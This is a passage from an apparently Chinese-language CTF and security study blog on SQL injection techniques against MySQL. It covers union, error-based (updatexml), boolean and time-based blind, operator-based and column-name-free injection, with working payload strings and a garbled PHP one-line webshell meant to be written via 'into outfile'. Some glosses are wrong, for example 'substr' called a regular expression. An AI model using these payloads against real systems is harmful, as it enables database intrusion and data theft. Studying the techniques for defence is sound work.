punctuation">,</span><span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210528192350589.png" alt="image-20210528192350589"></p><p>  vlaues row()语句可接入多种语句中执行</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> mujie<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210528192733112.png" alt="image-20210528192733112"></p><p>  或者：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> mujie <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">^</span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">3</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span> <span class="token keyword">union</span>  <span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  总的来说 values row() 语句就是提供了类似select 1,2,3 的功能，当使用values语句可以一次定义更多的虚拟数据</p><p>  除了构建虚拟表，values row()语句还可以快速创建真实的表</p><p>  values row()语句定义列名，需配合select 使用</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xxx<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210528194924357.png" alt="image-20210528194924357"></p><p>  配合create table 语句</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> users<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xxx<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  <img src="image-20210528195303944.png" alt="image-20210528195303944"></p><p>  定义表的类型</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> userss <span class="token punctuation">(</span>id <span class="token keyword">int</span><span class="token punctuation">,</span>username char<span class="token punctuation">,</span>password char<span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> xxx<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  <img src="image-20210528195846823-1622203128475.png" alt="image-20210528195846823"></p><p>  以上就是mysql8在命令部分的新特性，可用于注入攻击</p></li></ul><h1 id="注入部分"><a href="#注入部分" class="headerlink" title="注入部分"></a>注入部分</h1><h2 id="select-from-命令控制语句"><a href="#select-from-命令控制语句" class="headerlink" title="select * from 命令控制语句"></a>select * from 命令控制语句</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><ul><li><p>limit 语句  </p><blockquote><p>例如：limit 0,1 //从第一个值开始，输出一个值<br>limit 1,2 //从第二个开始，输出两个<br>以此类推  </p></blockquote></li><li><p>order by 命令  </p><blockquote><p>英译：排序  </p></blockquote></li></ul><blockquote><p>升降排序<br>  用于对结果集按照一个列或者多个列进行排序。<br>  命令格式：<br>  order by [列1];//将数据按列1顺序升序排列<br>  order by [列2] DESC;//将数据按列2顺序降序排序<br>  ASC 升序，使用order by一般默认升序排序<br>  DESC 降序;<br>  注意：ASC和DESC只对它紧跟着的第一个列名有效，其他不受影响，仍然是默认的升序。  </p></blockquote><blockquote><p>确定列数(指定列排序)<br>  order by语句可以不输入列名，而是输入数字表示具体列<br>  如order by 1 ;表示对第一列进行排序  </p></blockquote><ul><li>联合查询(union语句)  <blockquote><p>英译：联合  </p></blockquote></li></ul><blockquote><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。<br>  请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。<br>  同时，每个 SELECT 语句中的列的顺序必须相同。<br>  默认地，UNION 操作符选取不同的值。如果允许重复的值，需使用 UNION ALL。  </p></blockquote><blockquote><p>union语法<br>  select [列1名] from [表1名]<br>  union<br>  select [列2名] form [表2名];<br>  //联合查询表1中列1和表2中列2，并输出其中所有内容(value)【不重复】。<br>  使用union all 可输出重复的内容。<br>  语句后可加入order by / where 语句注释联合查询结果。</p></blockquote><blockquote><p>union select [数字组]//例如：union select 1,2,3;<br>  我们写的一串数字就是一个数组（或1个行向量），这时select实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组。<br>  select直接加数字串不指向任何数据库的表，用于找到数据库与前端显示的通道，确定注入点。  </p></blockquote><ul><li><p>concat()函数  </p><blockquote><p>功能：将多个字符串连接成一个字符串。<br>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。<br>语法：concat(str1, str2,…)<br>例1:select concat (id, name, score) as info from tt2;<br>//将表tt2中的id,name,score连接起来，输出到info中。<br><img src="4.png" alt="4"></p></blockquote></li><li><p>concat_ws()函数  </p><blockquote><p>和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）<br>语法：concat_ws(separator, str1, str2, …)<br>说明：第一个参数指定分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null。<br>例如：concat_ws(‘,’,id,name,sorce) as info from tt2;  </p></blockquote>   </li><li><p>group by 语句  </p><blockquote><p>英译：分组依据<br>用途如字面意思，通过by后的规则进行分组<br>所谓的分组就是将一个“数据集”划分成若干个“小区域”，然后针对若干个“小区域”进行数据处理。<br>举例：<br>select 类别, sum(数量) as 数量之和<br>from A   png<br>group by 类别<br><img src="5.png" alt="5"></p></blockquote></li><li><p>group_concat() 函数  </p><blockquote><p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。<br>相当于执行完group by 后再次执行concat()语句。<br>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator ‘分隔符’] )<br>//distinct 英译：不同的。  可以排除重复值。<br>如果希望对结果中的值进行排序，可以使用order by子句<br>separator是一个字符串值，不进行规定默认为一个逗号。  </p></blockquote>  </li><li><p>lines terminated by 方法</p><blockquote><p>意为：每行都以…结尾<br>例如：lines terminated by ‘<?php "hello world"?>‘<br>每行都以单引号中的内容结束<br>常配合into outfile写入木马</p></blockquote></li><li><p>schema  </p><blockquote><p>英译：模式，架构<br>schema定义了表、每个表的字段，还有表和字段之间的关系。<br>简单说schema是开发者创建的，储存表、列信息的特殊数据库。<br>如果把database看作是一个仓库，仓库很多房间（schema），一个schema代表一个房间，table可以看作是每个房间中的储物柜，user是每个schema的主人，有操作数据库中每个房间的权利，就是说每个数据库映射user有每个schema（房间）的钥匙。<br>在mysql中，database与schema等价。  </p></blockquote></li></ul><h3 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h3><ul><li><p>left()函数  </p><blockquote><p>left 英译：左边<br>语法：left（参数1，参数2） 意为 将参数1从左开始取参数2个<br>例如：left(abc,2) //将abc从左边取两位<br>注：此时无返回值<br>加入判断语句：<br>left(abc,1) &gt; “a”  //成立返回1，不成立返回0;  </p></blockquote></li><li><p>mid()函数  </p><blockquote><p>mid 译为中间<br>此函数为截取字符串一部分。<br>语法：mid(column_name,start[,length])<br>start：起始值，mid函数用于将字符串从起始值(从1开始)开始截取指定位数<br>length:指定截取位数<br>例如：mid(abcdefg,1,1)  //从“abcdefg”中第一个开始截取一字符<br>同left，加入判断语句可得到返回值  </p></blockquote></li><li><p>substr()函数[等同于substring()函数]   </p><blockquote><p>substr 译：正则表达式<br>功能同mid()函数<br>语法:substr(string,start,length)<br>string为字符串，可以是sql语句,其他内容与mid()相同<br>例如：substr(123456,2,1)=2 //判断第二个是否为二，是返回正确(1)，不是返回(0)  </p></blockquote></li><li><p>ord()函数  </p><blockquote><p>功能同mid，但会将得到的字符串转化为ASCII码值，常与前三个函数连用  </p></blockquote></li><li><p>ascii()函数  </p><blockquote><p>将括号内的字符串转化为ascii码值  </p></blockquote></li><li><p>regexp 方法  </p><blockquote><p>正则表达式函数，用与匹配文本，支持where指定<br>语法：select [表] from [数据库] where [指定检索] regexp ‘[关键字]’;<br>返回数据库/表/列中含有关键字的数据。<br>例如：select users from security where security.users regexp ‘^abc|^123|123|password$’;<br>//返回users表中以abc开头或以123开头或含有123或以password结尾的数据。  </p></blockquote></li></ul><blockquote><p>符号解析：<br> ^ ：用字符串前，表示以此字符串开头<br> | ：用于两字符串中间，表示或<br> $ ：用于字符串末尾，表示以此字符串结尾<br> 上述三个符号可以连用<br> 特别的：<br> [字符串1]字符串2 ：用于写有重复字符的或语句<br> 如：[abc]1  //返回含有a1或b1或c1的字符串<br> 也可以写为[a-c]1，返回结果一致  </p></blockquote><ul><li>like 方法  <blockquote><p>like的用法大体上和regexp一致，只有符号表示有区别<br>like只有%<br>例如：select [表，列等] from [库，表等] where [指定检索] like ‘[关键字]’<br>select users from security where security like ‘G%’;<br>//返回以G开头的字段<br>同理：’%G’ - 返回以G结尾的字段,’%G%’ - 返回包含G的字段。  </p></blockquote></li></ul><h3 id="简易查看"><a href="#简易查看" class="headerlink" title="简易查看"></a>简易查看</h3><ul><li><p>database()<br>查看当前数据库：select database();  </p></li><li><p>user()<br>查看当前登录的用户：select user();  </p></li><li><p>version()<br>查看当前的数据库版本   </p></li></ul><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul><li><p>rand()函数  </p><blockquote><p>rand，random简写，译：随机的<br>在sql中用于返回一个范围在0-1的随机数，这点等同于excl表格<br>在如c、python等语言中，rand()函数用于返回伪随机数（随机整数），非0-1<br>特别的：<br>1、在rand后指定一个数，如rand(1),得到的随机数将固定，可以为小数，该方法遵循四舍五入法则<br>2、在rand()*N[N是一个数]将返回从0-N的随机数，但我测试后，我认为是将rand()得到的随机数乘N，N可以为小数<br>3、可以用于order by后，返回打乱顺序的列  </p></blockquote></li><li><p>floor()函数  </p><blockquote><p>floor，译:地板，与c语言的地板除法类似<br>功能是取整（同c地板除法一样为向下取整）<br>例如：floor(2.9)=2  </p></blockquote></li><li><p>round()函数   </p><blockquote><p>round,译：绕行，绕过，把数字四舍五入<br>功能同floor为取整，不同于floor向下取整，round是将数四舍五入  </p></blockquote></li><li><p>ceiling()函数  </p><blockquote><p>ceiling，译：天花板<br>功能同floor为取整，但ceiling函数为向上取整  </p></blockquote></li><li><p>count()函数  </p><blockquote><p>count，译：计数<br>例如：<br>count(columns)//返回列数<br>count(*)//输出总行数  </p></blockquote></li><li><p>updatexml()函数  </p><blockquote><p>updatexml是基于PATH传参的函数<br>xml是xml文档的名称，中文为doc<br>updatexml译：更新xml文档<br>用于在sql中报错注入<br>语法：updatexml(XML_document,Xpath_string, new_value);<br>xml_document:原来文档的名称，是string类型<br>Xpath_string:Xpath格式的字符串，文件的路径<br>new_value：新的值，用于替换查找到符合条件的字符串<br>注意：因Xpath_string是字符串形式，所以若想正常报错，需用concat函数将返回的值连接  </p></blockquote></li><li><p>-&gt;原理：<br>文件路径是不允许非法字符出现的，当出现非法字符就会爆出错误<br>所以使用查询语句查询后，和非法字符连接，就会形成报错<br>如：updatexml(1,(select concat(0x7e,schema_name) from information_schema.schemata limit 0,1),0)–+<br>这里0x7e是16进制的“<del>”，属于非法字符，当</del>放在合法的数据库名前，就会以非法路径报错<br>数据库本质类似文件夹，可以作为路径使用，不过这里是因为我们可以写入任意值作为路径，对不对倒是无所谓  </p></li></ul><blockquote><p>除了select，还可以利用updatexml完成insert，update和delete注入，原理和select相同。<br> insert into guestbook(comment_id,comment,name) values (2,’0livia’ or updatexml(1,concat(0x7e,(version())),0) or’’,’Nervo’)<br> delete from guestbook where comment_id=2 or updatexml(2,concat(0x7e,(database())),0)  </p></blockquote><ul><li>extractvalue()函数   <blockquote><p>extract value译：提取值<br>功能：查询文档，相当于HTML文件中用 div&gt;<p> <a></a>标签查找元素<br>语法：<br>extractvalue(xml文档名,路径)<br>原理同updatexml(),都是基于路径不能有非法字符  </p></blockquote></li></ul><h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><p>sql支持正则匹配</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token operator">regexp</span> <span class="token string">'正则表达式'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>规则：</p><p>  <code>^str</code>表示匹配以str为开头的字符</p><p>  <code>str</code>匹配str</p><p>  <code>str$</code>表示匹配以str为结尾的字符</p></li><li><p>匹配多个字符</p></li></ul><table><thead><tr><th>元字符</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>0个或多个匹配</td></tr><tr><td>+</td><td>1个或多个匹配</td></tr><tr><td>？</td><td>0个或1个匹配</td></tr><tr><td>{n}</td><td>指定数目的匹配</td></tr><tr><td>{n，}</td><td>不少于指定数目的匹配</td></tr><tr><td>{n,m}</td><td>匹配数目的范围（m不超过255）</td></tr></tbody></table><h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><blockquote><p>SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。  </p></blockquote><p>而造成SQL注入的原因是因为程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。  </p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><ul><li>查看是否有读写权限</li></ul><blockquote><p><code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> file_priv <span class="token keyword">from</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">where</span> <span class="token keyword">user</span><span class="token operator">=</span>$<span class="token keyword">USER</span>  host<span class="token operator">=</span>$HOST<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p><ul><li>无内容，表示无限制。</li><li>为NULL，表示禁止文件读/写。</li><li>为目录名，表示仅允许对特定目录的文件进行读/写。</li></ul><p>注：<strong>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容</strong>。</p><p>三种方法查看当前<code>secure-file-priv</code>的值：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@secure_file_priv</span><span class="token punctuation">;</span><span class="token keyword">select</span> @<span class="token variable">@global.secure_file_priv</span><span class="token punctuation">;</span><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"secure_file_priv"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>修改：</p><ul><li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li><li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li></ul></blockquote><ul><li><p>写入小马——一句话木马  </p><blockquote><p>php木马  </p><?php @evil($_POST(["密码值"]);?></blockquote></li><li><p>eval()函数  </p><blockquote><p>eval 译：邪恶的，目前常见于一句话木马攻击<br>用法：<br>eval(数字)，返回数字<br>eval(字符串)，解析字符串，作为代码运行   </p></blockquote></li><li><p>_POST()函数与GET()函数<br>POST和GET都是bai向服务器提交数据，并且都会从服务器获取数据。</p></li><li><p>区别：<br> 1、传送方式：get通过地址栏传输，post通过报文传输。  </p></li></ul><p>  2、传送长度：get参数有长度限制（受限于url长度），而post无限制  </p><p>  3、GET和POST还有一个重大区别，简单的说：  </p><p>  GET产生一个TCP数据包；POST产生两个TCP数据包  </p><p>  长的说：  </p><p>  对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；  </p><p>  而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。  </p><p>  过程不同<br>  GET是把参数数据队列加到提交表单的ACTIONbai性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到<br>  POST是通过HTTP post机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTIONbai性所指的URL地址。用户看不到这个过程。    </p><p>  获取值不同<br>  对于get方式，服务器端用Request.QueryString获取变量的值。<br>  对于post方式，服务器端用Request.Form获取提交的数据。  </p><p>  传送数据量不同<br>  get传送的数据量较小，不能大于2KB。<br>  post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。   </p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><ul><li>if()函数<blockquote><p>if(语句,正确,错误)<br>例如：if((ascii(substr((select database()),1,1))) &gt; 122 ,1,2)<br>如果database第一个字符的ascii值大于122,返回1，否则返回2<br>完整语句：<br>?id=1’ and if((ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;22),1,0)–+  </p></blockquote></li></ul><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul><li><p>length()函数  </p><blockquote><p>length 译为：长度<br>用于返回字符串长度<br>如：length(“security”)或 length(select database())=8  </p></blockquote></li><li><p>sleep()函数  </p><blockquote><p>sleep 译为：睡觉<br>用于延迟网页响应<br>如：sleep(5) //延迟5秒后响应 或 睡眠5秒  </p></blockquote></li><li><p>benchmark()函数</p><blockquote><p>bench mark 译为基准点</p><p>用于循环执行一条语句</p><p><strong>BENCHMARK（count,expr) 函数重复count次执行表达式expr，它可以用于计时MySQL处理表达式有多快，结果值总是0。</strong></p><p>语法;</p><p>benchmark(执行次数，执行语句)，注入时用发同sleep()</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and if(1=1,benchmark(1000000,md5('</span>test'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>benchmark()函数还可以用在select查询中</p><pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>benchmark<span class="token punctuation">(</span><span class="token number">10000000000000000</span><span class="token punctuation">,</span>md5<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当语句正确时benchmark执行，页面显示延时</p><p>这样就巧妙的绕过了if()函数对盲注的影响</p><p>当然运算符注入也可以脱离if</p></blockquote></li></ul><h4 id="运算符注入"><a href="#运算符注入" class="headerlink" title="运算符注入"></a>运算符注入</h4><p>php和mysql中存在多种运算符，这些运算符也可以应用在注入中</p><p>CTF中这种注入方式很常见</p><ul><li><p>异或运算</p><blockquote><p>符号：xor 或 ^<br>a ^ b 当a,b相同时返回0，不同时返回1<br>如</p></blockquote><pre class="line-numbers language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span>'<span class="token operator">^</span> <span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token string">"union"</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>当<span class="token keyword">union</span>未被过滤返回<span class="token number">0</span><span class="token punctuation">,</span>过滤返回<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210525155303335.png" alt="image-20210525155303335"></p></li><li><p>等于运算</p><blockquote><p>符号：= 或 like</p><p>a=b时返回1，否则返回0</p><p>如：</p><pre class="line-numbers language-SQL"><code class="language-SQL">select * from users where id=(1=1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210525155623553.png" alt="image-20210525155623553"></p><p>注入语句：</p><p><img src="image-20210525155724010.png" alt="image-20210525155724010"></p></blockquote></li><li><p>不等运算</p><blockquote><p>sql有一个特殊的不等运算符：&lt;&gt;</p><p>用法同!=</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210525155923856.png" alt="image-20210525155923856"></p></blockquote></li><li><p>非运算</p><blockquote><p>sql允许！（非运算符）的存在</p><p>通过！假或！真，我们就可以灵活的注入各种情况</p><p><img src="image-20210525160654754.png" alt="image-20210525160654754"></p><p>或者：</p><p><img src="image-20210525160823944.png" alt="image-20210525160823944"></p></blockquote></li></ul><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><blockquote><p>有些时候，我们无法得列名，这种情况包括但不限于过滤了information_schema库</p></blockquote><h3 id="表名的多种查询方式"><a href="#表名的多种查询方式" class="headerlink" title="表名的多种查询方式"></a>表名的多种查询方式</h3><ul><li>系统库概念</li></ul><blockquote><p>mysql系统自带的库一共有四个分别为information_schema,mysql,perfromance_schema,sys</p></blockquote><ul><li>information_schema库</li></ul><blockquote><p>information_schema是一个信息数据库，记录了其他所有数据库的信息</p><p>这是查询表名，列名最常用的库</p></blockquote><ul><li>mysql库</li></ul><blockquote><p>mysql库是mysql的核心数据库，负责储存数据库的用户，权限设置，root密码就储存在这里</p><p>这个数据库同样储存了表名</p><p>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p></blockquote><blockquote><p>payload:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> mysql<span class="token punctuation">.</span>innodb_table_stats <span class="token operator">||</span> mysql<span class="token punctuation">.</span>inndb_index_starts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><ul><li>performance_schema库</li></ul><blockquote><p>performance_schema 主要用于手机服务器性能参数</p></blockquote><ul><li>sys 库</li></ul><blockquote><p>Sys库所有的基础数据来自information_schema和performance_chema。目标是把performance_schema的把复杂度降低，其本身不储存数据</p><p>让DBA能更好的阅读这个库里的内容。让DBA更快的了解DB的运行情况。</p><p>可以通过其中的schema_auto_increment_columns 表来获取表名。</p></blockquote><h3 id="无列名原理"><a href="#无列名原理" class="headerlink" title="无列名原理"></a>无列名原理</h3><ul><li>原理</li></ul><blockquote><p>原理和给列别名类似，类似于在取别名的同时查询数据</p><p>当然我认为有联合查询的影子</p></blockquote><ul><li><p>payload举例：</p><p>  当select 1,2,3;时，数据库会自动建立一个列名和数据都为123的虚拟库</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210524111601355.png" alt="image-20210524111601355"></p><p>  联合查询基于这个原理，是将123写入列名下查看回显和数据</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="image-20210524111818234.png" alt="image-20210524111818234"></p><p>  无列名原理恰好与此相反，是将数据写入虚拟的1,2,3,列下</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><img src="image-20210524111959779.png" alt="image-20210524111959779"></p><p>这样做，我们便从不知到列名，变成了自定义一个列名，查询这个虚拟表，就得到了数据</p><h3 id="起别名查询"><a href="#起别名查询" class="headerlink" title="起别名查询"></a>起别名查询</h3><p>知道原理，我们可以明白，无列名注入的基本语句如下</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">3</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">#括号中的语句表示创建的虚拟表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>理论上这样没有错误，但括号里得到的是一个虚拟表，没有表名，会发生报错，所以我们需要给它起个表名</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">3</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">;</span> <span class="token operator">||</span> <span class="token keyword">as</span> <span class="token number">a</span><span class="token comment" spellcheck="true">#直接跟a或者as a都是起别名的方式，这里a是我们给虚拟表别名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20210524113358646.png" alt="image-20210524113358646"></p><p><strong>注意：3使用反引号包括，因为在虚拟表中，列名都是1，2，3，所以我们在查询语句中不能直接用 3 。</strong></p><p>有时反引号被过滤，所有可以用另一种方式</p><pre class="line-numbers language-sql"><code class="language-sql"> <span class="token keyword">select</span> A <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token 